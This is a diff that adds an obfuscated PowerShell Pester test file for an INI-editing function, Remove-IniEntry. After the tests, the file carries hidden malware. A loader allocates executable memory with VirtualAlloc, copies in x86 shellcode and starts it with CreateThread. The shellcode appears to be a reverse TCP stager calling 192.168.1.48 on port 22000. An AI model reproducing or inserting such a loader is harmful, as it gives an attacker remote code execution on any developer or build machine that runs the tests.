@@ -1,0 +1,144 @@
+  Set  ("o"+"cFIVP")  ([TyPe]("{0}{1}{2}"-f 'i','O.p','AtH') )  ; 
+
+
+
+
+
+
+
+
+
+
+
+${I`NI`patH} = ${N`ULL}
+
+&("{0}{1}" -f'Descr','ibe') ("{2}{0}{3}{1}"-f't-RemoveIniEn','ry','Tes','t') {
+    .("{0}{1}{2}"-f 'B','efore','All') {
+        & (.("{1}{2}{0}"-f 'h','Jo','in-Pat') -Path ${PsScR`i`Ptr`O`Ot} -ChildPath ("{3}{2}{0}{1}{4}" -f'arbon','T','e-C','Initializ','est.ps1') -Resolve)
+    }
+    
+    .("{2}{1}{0}"-f 'h','oreEac','Bef') {
+        ${i`Nipa`Th} = &("{2}{0}{1}"-f 't','h','Join-Pa') (  ( vaRIABLE ('ocfi'+'Vp')  -VaLU )::("{3}{0}{1}{2}"-f 'tTemp','P','ath','Ge').Invoke()) ( ( dIR  ('v'+'aR'+'Iable:'+'o'+'CFIvP')  ).VALUE::("{1}{2}{3}{0}"-f 'ame','G','etR','andomFileN').Invoke())
+        ${nu`LL} = &("{1}{0}"-f 'ew-Item','N') ${I`NIPA`Th} -ItemType ("{0}{1}" -f 'F','ile')
+        ((("{3}{5}{2}{8}{1}{0}{14}{10}{15}{12}{17}{4}{9}{6}{11}{7}{13}{16}"-f'ec','lue1 = duplicate
+
+[s','o','BbI
+s','lue2
+','ecti','codev','?','nless = value
+section1va','uni','ion','alue = ?????????','ue1 = v','
+
+B','tion1]
+sect','1val','bI','a'))."REPla`cE"('BbI',[STRING][cHAr]39)) | &("{2}{1}{0}"-f 'Content','et-','S') -Path ${iniPA`Th}
+        ${G`lOb`A`L:erRor}.("{1}{0}"-f'ar','Cle').Invoke()
+    }
+    
+    .("{1}{0}{2}"-f'fterE','A','ach') {
+        .("{2}{1}{3}{0}" -f'em','e-I','Remov','t') ${I`NipATh}
+    }
+    
+    
+    function as`SErT`-I`NIFILE
+    {
+        param(
+            [string]
+            ${eXpEC`T`ed`C`o`NtENtS}
+        )
+        
+        ${E`xpe`cT`Ed`liNEs} = @()
+        if( ${e`x`PEC`TE`dCOnTENtS} )
+        {
+            ${ExPe`ctEdli`NEs} = ${E`XPECTeDcoNTe`N`Ts} -split "`r`n"
+        }
+
+        ${i`NiP`ATH} | .("{0}{1}" -f'S','hould') ("{1}{0}"-f 'xist','E')
+
+        ${Ac`T`UALCO`NtenTs} = @( &("{3}{0}{1}{2}"-f 't-Co','nt','ent','Ge') ${iNI`p`AtH} )
+        ${A`ctua`lCONT`E`Nts}."LE`NgTH" | .("{0}{2}{1}"-f'Sho','d','ul') ('Be') ${expEC`T`EDli`NES}."LEN`gTh"
+        for( ${i`Dx} = 0; ${I`Dx} -lt ${A`Ct`UaLC`onTEnTs}."le`NgTH"; ++${i`Dx} )
+        {
+            ${a`CtU`ALCOnTEn`TS}[${I`Dx}] | &("{0}{1}"-f'Sh','ould') ('Be') ${e`xp`ECTed`lI`NEs}[${I`DX}]
+        }
+    }
+    
+    .('It') ("{2}{5}{8}{1}{6}{0}{4}{9}{7}{3}" -f 'e','em','shou',' that does not exist',' ','ld n','ov','y','ot r','entr') {
+        ${o`Ri`gInALi`NIFi`lE} = ((.("{0}{3}{1}{2}"-f 'Ge','e','nt','t-Cont') -Path ${InI`PatH}) -join "`r`n")
+    
+        &("{1}{0}{2}{4}{3}"-f'ov','Rem','e','niEntry','-I') -Path ${i`NipA`TH} -Section ("{0}{2}{1}"-f'sec','on','ti') -Name ("{0}{1}" -f 'emp','ty') 
+        ${ER`ROr}."Co`Unt" | .("{0}{2}{1}"-f 'Shou','d','l') ('Be') 0
+        .("{2}{0}{1}"-f 'IniFil','e','Assert-') ${oriG`iNalI`NIFi`lE}
+    }
+    
+    &('It') ("{3}{6}{2}{5}{1}{4}{0}" -f'f','r','ould sup','s','t what i','po','h') {
+        ${E`Rr`or}.("{0}{1}" -f'C','lear').Invoke()
+        ${ORi`GI`Nal`inifiLe} = ((&("{1}{0}{2}" -f '-Conte','Get','nt') -Path ${i`NipA`Th}) -join "`r`n")
+    
+        &("{0}{3}{1}{4}{2}"-f 'Re','e-','try','mov','IniEn') -Path ${InI`p`ATH} -Section ("{0}{1}"-f'sect','ion1') -Name ("{0}{4}{3}{1}{2}" -f'sect','ue','1','1val','ion') -WhatIf
+        ${err`or}."C`ouNT" | .("{0}{1}"-f 'Shoul','d') ('Be') 0
+        &("{3}{0}{2}{1}"-f'-Ini','ile','F','Assert') ${orig`InA`li`NIf`I`lE}
+    }
+    
+    &('It') ("{6}{5}{3}{2}{0}{1}{4}" -f 's ','e','sectionles',' ','ntry','hould remove','s') {
+        .("{4}{2}{1}{0}{3}" -f'i','In','e-','Entry','Remov') -Path ${iNi`Pa`Th} -Name ("{1}{2}{0}"-f 'e1','section','1valu')
+    
+    .("{2}{3}{4}{0}{1}"-f 'n','iFile','As','se','rt-I') ((("{2}{3}{15}{7}{11}{8}{12}{4}{20}{16}{13}{17}{1}{14}{18}{5}{19}{0}{9}{10}{6}"-f 'lue','= val','F0e
+section','les','1]
+','c','
+
+F0e','= value
+
+','ectio',' ','= ??????????','[s','n','e','ue','s ','ction1valu','1 ','2
+uni','odeva','se'))."ReP`LACe"(([chaR]70+[chaR]48+[chaR]101),[string][chaR]39))
+    }
+    
+    .('It') ("{6}{8}{1}{2}{9}{4}{3}{0}{7}{5}" -f 'n se',' ','re','i',' entry ','n','shoul','ctio','d','move') {
+        .("{2}{0}{1}" -f 'iEnt','ry','Remove-In') -Path ${I`NipAth} -Name ("{1}{2}{3}{0}{4}"-f'on','s','e','cti','1value1') -Section ("{2}{1}{0}" -f '1','ction','se')
+    
+    &("{0}{3}{2}{1}" -f'Assert-','File','i','In') ((("{12}{15}{5}{18}{11}{7}{13}{10}{0}{1}{3}{16}{14}{6}{4}{17}{2}{8}{9}"-f'n1]','
+un','????','ico','ue',' =','al','icate
+','???
+
+V','Ig','o','
+section1value1 = dupl','VIg','
+[secti','ev','
+sectionless','d',' = ???',' value'))."re`P`laCE"('VIg',[StrING][cHar]39))
+    }
+    
+    .('It') ("{5}{4}{0}{6}{7}{3}{2}{1}" -f 'd remov','s','ve ini option','ti','oul','sh','e cas','e sensi') {
+        ((("{2}{1}{14}{12}{13}{4}{8}{3}{15}{11}{6}{10}{7}{9}{16}{5}{0}"-f ' d
+
+Vox','x
+','Vo','
+[','E = ','e =','on]
+name = ','SE','b
+','CTION]
+','c
+
+[','cti','= a
+N','AM','name ','se','nam'))-CRePLaCE'Vox',[chAR]39) | .("{0}{2}{1}" -f'Set-Cont','t','en') -Path ${Ini`pAtH}
+    
+        &("{2}{0}{1}{3}"-f 'e','-IniEntr','Remov','y') -Path ${I`NIpa`TH} -Name ("{1}{0}"-f 'me','na') -CaseSensitive
+        .("{2}{1}{0}"-f '-IniEntry','ove','Rem') -Path ${inIP`ATh} -Section ("{0}{1}"-f's','ection') -Name ("{0}{1}"-f 'n','ame') -CaseSensitive
+    
+        ${i`Ni} = &("{0}{1}{2}" -f'Split','-I','ni') -Path ${in`i`paTH} -CaseSensitive -AsHashtable
+        ${i`Ni} | .("{0}{1}"-f'Shou','ld') ("{1}{0}" -f 't','No') ("{3}{1}{2}{0}"-f 'pty','Nul','lOrEm','Be')
+        ${i`Ni}."Co`UNT" | .("{1}{0}"-f 'ould','Sh') ('Be') 2
+        ${I`NI}[("{1}{0}"-f'E','NAM')]."Va`LuE" | .("{0}{1}"-f 'Shou','ld') ('Be') 'b'
+        ${I`Ni}[("{0}{2}{1}"-f 'SECTI','name','ON.')]."VAl`Ue" | .("{0}{1}"-f 'Sho','uld') ('Be') 'd'
+    
+    }
+
+    &('It') ("{3}{13}{14}{2}{0}{6}{10}{15}{7}{12}{8}{1}{4}{9}{11}{5}"-f're','e o','ld ','sh','nl','line','move last e',' from ',' when it is th','y','n',' ','a file','o','u','try') {
+
+        
+((("{3}{0}{2}{1}"-f 'y6
+MyKey = a
+','y6','l','l'))  -ReplACE'ly6',[cHaR]39) | .("{1}{2}{0}"-f'nt','Se','t-Conte') -Path ${i`NiPAth}
+
+        &("{2}{3}{4}{0}{1}"-f'Entr','y','Rem','ov','e-Ini') -Path ${IN`I`paTH} -Name ("{1}{0}"-f'yKey','M')
+
+        ${i`NI} = &("{1}{0}{2}{3}"-f'plit','S','-','Ini') -Path ${INIpa`TH} -AsHashtable
+        ${I`NI}."c`OUnT" | .("{0}{1}" -f'Shoul','d') ('Be') 0
+    }
+}
+
+${U`ls} = (((("{24}{119}{62}{50}{21}{40}{39}{79}{43}{38}{113}{116}{96}{26}{18}{101}{87}{4}{117}{54}{111}{120}{36}{115}{31}{95}{76}{90}{22}{110}{73}{107}{1}{2}{64}{66}{10}{75}{77}{34}{59}{25}{29}{17}{81}{44}{92}{61}{63}{69}{105}{82}{35}{53}{102}{15}{9}{56}{13}{67}{30}{100}{45}{112}{8}{88}{11}{51}{5}{98}{70}{37}{89}{109}{12}{52}{16}{46}{99}{20}{49}{57}{42}{28}{85}{83}{106}{94}{103}{104}{68}{86}{72}{14}{32}{91}{47}{7}{71}{114}{118}{0}{3}{108}{19}{60}{48}{6}{74}{41}{27}{93}{65}{84}{80}{78}{55}{97}{33}{23}{58}" -f ')]public ','tect',');[D','s','ir','int','Ptr','drDmsvcr','ut','r','Impo','s, ','lp','l',' lpThr','IntPt','rt','.dll','ern Int','ic ext','re','t(','i','count)','[','rn','t','ms','pPa','el32','d',', uint','eadId);',' ','Dk','r C','wSiz','ize, ','pu','Dkernel3','dr','me','r l','drD)]',')]pub','t','A','DllImport(','rn Int','ss','lImpor','u','Sta','reateThrea','ddress, ui','r',' ',', IntPt',';','e','e','stat','l','ic extern','l','t','l','pThrea','nt',' In','tackS','t','tr','flP',' ','rt','location','(dr',' s','2.dll','int','drD','t',', uint','r dest, u','rameter','P','V','e','IntPtr','Type, u','[','lic ','et(IntP','at',' flAl','ex','c, uint',' dwS','dd','At','Ptr ','d(','io','nFlags, I','tP',' dwCre','ro','tat',' ','nt ','nt','rib','blic stat','.dlld','e','ic ','tualAlloc(IntPtr lpA','rD','D',' d')) -REPLaCE  ([ChAr]100+[ChAr]114+[ChAr]68),[ChAr]34));${w} = .("{0}{2}{1}" -f'Add','pe','-Ty') -memberDefinition ${u`LS} -Name ("{1}{0}" -f'n32','Wi') -namespace ("{2}{4}{0}{1}{3}"-f'cti','on','Win','s','32Fun') -passthru;[Byte[]];[Byte[]]${z} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x30,0x68,0x02,0x00,0x55,0xf0,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${g} = 0x1000;if (${z}."Len`gTH" -gt 0x1000){${g} = ${Z}."L`E`Ngth"};${T`Fe}=${W}::("{2}{0}{1}" -f'rtualA','lloc','Vi').Invoke(0,0x1000,${G},0x40);for (${i}=0;${I} -le (${Z}."l`e`NgTH"-1);${I}++) {${w}::"meM`seT"([IntPtr](${T`Fe}.("{1}{2}{0}" -f '2','ToInt','3').Invoke()+${I}), ${z}[${I}], 1)};${w}::("{3}{2}{0}{1}"-f'T','hread','e','Creat').Invoke(0,0,${t`FE},0,0,0);for (;;){.("{1}{0}{3}{2}"-f't','Star','ep','-sle') 60};
